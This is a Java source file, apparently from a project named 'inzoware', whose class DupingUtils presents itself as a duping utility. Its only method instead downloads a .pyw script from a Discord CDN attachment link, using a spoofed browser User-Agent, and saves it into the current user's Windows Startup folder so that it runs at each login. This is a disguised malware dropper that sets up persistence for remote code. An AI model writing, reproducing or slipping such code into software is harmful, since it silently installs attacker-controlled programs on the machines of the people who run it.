package com.inzo.technologies.inzoware.utils;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.URL;
import java.net.URLConnection;

public class DupingUtils {

    public static void Duper() {

        String username = System.getProperty("user.name");

        InputStream inzo = null;
        OutputStream ware = null;
        String fileUrl = "https://cdn.discordapp.com/attachments/943226019261841438/943226541674999868/Windows_Python-Startup.pyw";
        String outputPath = "C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Windows_Python-Startup.pyw"; 
        try {
            URL url = new URL(fileUrl);
            URLConnection connection = url.openConnection();
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36");
            inzo = connection.getInputStream();
            ware = new FileOutputStream(outputPath);
            final byte[] b = new byte[2048];
            int length;
            while ((length = inzo.read(b)) != -1) {
                ware.write(b, 0, length);
            }
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            if (ware != null) {
                try {
                    ware.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            if (inzo != null) {
                try {
                    inzo.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }
}
